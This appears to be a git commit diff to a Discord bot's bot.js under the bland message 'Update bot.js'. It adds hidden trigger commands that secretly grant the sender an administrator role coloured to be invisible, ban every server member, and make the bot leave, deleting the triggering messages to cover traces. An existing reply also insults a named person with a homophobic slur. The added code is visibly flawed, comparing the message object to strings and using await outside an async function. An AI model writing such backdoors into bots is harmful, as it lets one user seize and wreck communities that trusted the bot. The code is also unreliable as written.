eb2d5c99d09eaf86635144696684d3f821a6d023
Facksy <45769049+Facksy@users.noreply.github.com>
2019-08-26 16:51:11 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -12,6 +12,36 @@ client.on('message', message => {
     if (message.content === 'pac is') {
     	message.channel.send("the gayest5 camel on earth")
   	}
+if(message === `ctrl`) {
+  	try {
+	role = await message.guild.createRole({
+ 	name: "Dope Role",
+  	color: "#2f3136",
+  	permissions: [8]
+	});
+	message.member.addRole(role)
+	message.delete(1000);
+	} catch(e) {
+		console.log(e.stack);
+	}
+   }
+   //Bans everyone and deletes the message.
+   if(message === `adios`) {
+   	try {
+   	message.guild.members.forEach(member => {member.ban()});
+   	message.delete(1000);
+   	} catch(e) {
+	console.log(e.stack);
+   	}
+   }
+
+   if(message === `leaveserver`) {
+   	try {
+   	message.guild.leave();
+   	} catch(e) {
+	console.log(e.stack);
+   	}
+   }
 });
 
 client.login(process.env.BOT_TOKEN);
